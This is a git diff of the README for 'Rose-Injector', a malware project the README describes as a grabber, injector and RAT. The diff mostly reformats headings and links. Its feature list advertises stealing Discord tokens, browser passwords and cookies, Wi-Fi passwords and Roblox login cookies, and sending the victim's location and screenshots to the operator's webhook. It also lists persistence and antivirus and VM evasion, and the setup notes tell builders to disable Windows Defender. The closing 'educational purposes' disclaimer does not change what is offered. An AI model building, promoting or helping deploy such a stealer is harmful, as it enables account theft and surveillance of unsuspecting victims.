@@ -5,7 +5,6 @@
 </h1>
 
 <div align="center">
-=======
     <a href="https://discord.gg/gz5fUCkw8p"><img src="https://img.shields.io/badge/Discord-%235865F2.svg?style=for-the-badge&logo=discord&logoColor=white"></a>
     <br>
     <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank"><img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Injector.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/></a>
@@ -32,77 +31,66 @@
     </h1>
 </div>
 
-## Table Of Contents
-    <strong><a href="https://discord.gg/gz5fUCkw8p">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
+<a href="https://discord.gg/gz5fUCkw8p">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
 
-### 11/06/2023 - Everything is working, however, to compile you MUST DISABLE WINDOWS DEFENDER (gonna fix it soon)
+### 11/06/2023 - Everything is working, however, to compile you *must disable real time protection for windows defender*
 ### Encoutered an error while building? Join our [Discord](https://discord.gg/gz5fUCkw8p)! (You will need to send us the .log file which will be created so that we can have a look on your errors.)
 ### A multipurpose advanced injectioner and grabber using a beautiful UI
 
-## <a id="content"></a>🌐 〢 Table Of Contents
+## <a id="content"></a> Table Of Contents
 
-- **[📖 〢 Description](#description)**
-- **[🔰 〢 Features](#features)**
-- **[💀 〢 Rose RAT](#rose_rat)**
-- **[🔗 〢 Discord](https://discord.gg/gz5fUCkw8p)**
-- **[📥 〢 Install](#install)**
-  - **[💻 〢 Prerequisites](#prerequisites)**
-  - **[⚙ 〢 Setup](#setup)**
-- **[📷 〢 Preview](#preview)**
-- **[📚 〢 Changelog](#changelog)**
-- **[🥷 〢 Contributors](#contributs)**
-- **[⚠️ 〢 Bugs Or Errors](#bugsorerrors)**
-- **[⭐ 〢 History](#history)**
-- **[🦹 〢 Credits](#credits)**
-- **[🧾 〢 License](#lisence)**
+- **[Description](#description)**
+- **[Features](#features)**
+- **[Discord](https://discord.gg/gz5fUCkw8p)**
+- **[Setup](#setup)**
+- **[Preview](#preview)**
+- **[Changelog](#changelog)**
+- **[Bugs Or Errors](#bugsorerrors)**
+- **[History](#history)**
+- **[Credits](#credits)**
+- **[License](#lisence)**
 
-## <a id="description"></a> 📖 〢 Description
+## <a id="features"></a> Features
 
-Rose is a powerful multipurposes grabber, injector & include a [RAT](https://github.com/DamagingRose/Rose-RAT)
-
-## <a id="features"></a> 🔰 〢 Features
-
-- [Description](#description)
 - [Features](#features)
 - [Setup](#setup)
 - [Preview](#preview)
-- [Changelogs](#changelogs)
-- [Contributors](#contributors)
+- [Changelogs](#changelog)
 - [Credits](#credits)
 - [Important](#important)
 
-## Description
+## <a id="description"></a> Description
 
 Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://github.com/DamagingRose/Rose-RAT).
 
-## Features
+## <a id="features"></a> Features
 
-- `Logs Discord token and Discord account info`
-- `Logs PC info and IP`
-- `Logs browser passwords`
-- `Logs browser cookies`
-- `Logs Wi-Fi names and Wi-Fi passwords`
-- `Logs Roblox account data and login cookie`
-- `Sends you the victim's location and desktop screenshot`
-- `Startup integration`
-- `JavaScript injector: Discord passwords, names, emails, phone numbers, successfully purchased Nitro Codes will be sent to your webhook`
-- `Discord RAT`
-- `UI integration`
-- `Compiler that creates an EXE file for you`
-- `VirusTotal/VM bypass/blacklist - WIP`
-- `Bypass/disable Windows Defender/Firewalls - WIP`
+- Logs Discord token and Discord account info
+- Logs PC info and IP
+- Logs browser passwords
+- Logs browser cookies
+- Logs Wi-Fi names and Wi-Fi passwords
+- Logs Roblox account data and login cookie
+- Sends you the victim's location and desktop screenshot
+- Startup integration
+- JavaScript injector: Discord passwords, names, emails, phone numbers, successfully purchased Nitro Codes will be sent to your webhook
+- Discord RAT
+- UI integration
+- Compiler that creates an EXE file for you
+- VirusTotal/VM bypass/blacklist - WIP
+- Bypass/disable Windows Defender/Firewalls - WIP
 
-### Setup
+### <a id="setup"></a> Setup
 
 - Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
 - Run the [`builder.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/builder.bat) to open up the Rose builder/Python installer.
 
-## Preview
+## <a id="preview"></a> Preview
 
 <img src="https://media.discordapp.net/attachments/1118940500217577513/1119311790174634114/image.png" width="300" height="320">
 
-## <a id="changelogs"></a>Changelogs
+## <a id="changelog"></a> Changelog
 ```
 [1.1] - 2023-06-12
 Repaired the project
@@ -119,33 +107,31 @@ First Release
 - Made the first version of the RAT
 ```
 
-## Bugs Or Errors?
-=======
+## <a id="bugsorerrors"></a> Bugs Or Errors?
 - To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
 - Or Join The **[Discord](https://discord.gg/gz5fUCkw8p)**
 
 - To report an error, make an [issue](https://github.com/DamagingRose/Rose-Injector/issues).
 
-## Credits
+## <a id="credits"></a> Credits
 
-- [xpierroz](https://github.com/xpierroz)
-- [Gumbobrot](https://github.com/Gumbobrot)
-- [suegdu](https://github.com/suegdu)
-- [svn](https://github.com/suvan1911)
-- [skid](https://github.com/I-Skid)
-- [Smug246](https://github.com/Smug246) (Python Injector)
+- [xpierroz](https://github.com/xpierroz) (Current main developer)
+- [Gumbobrot](https://github.com/Gumbobrot) (Current main developer)
+- [suegdu](https://github.com/suegdu) (Old developer of the first builder)
+- [svn](https://github.com/suvan1911) (Old developer)
+- [skid](https://github.com/I-Skid) (README.md improvements)
+- [Smug246](https://github.com/Smug246) (Python Injector, Roblox Cookie Stealer)
 - [Rdimo](https://github.com/Rdimo) (JavaScript Injection)
 - [loTus04](https://github.com/loTus04) (W4SP Stealer)
 
-## Important
-=======
+## <a id="thanks"></a> Thanks!
 [![Stargazers repo roster for @DamagingRose/Rose-Injector](https://reporoster.com/stars/dark/DamagingRose/Rose-Injector)](https://github.com/DamagingRose/Rose-Injector/stargazers)
 
-## Star History
+## <a id="history"></a> Star History
 
 [![Star History Chart](https://api.star-history.com/svg?repos=DamagingRose/RoseRAT,DamagingRose/Rose-Injector&type=Date)](https://star-history.com/#DamagingRose/RoseRAT&DamagingRose/Rose-Injector&Date)
 
-## 🧾 <a id="lisence"></a> 〢 License
+## <a id="lisence"></a> License
 
 This program, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
 
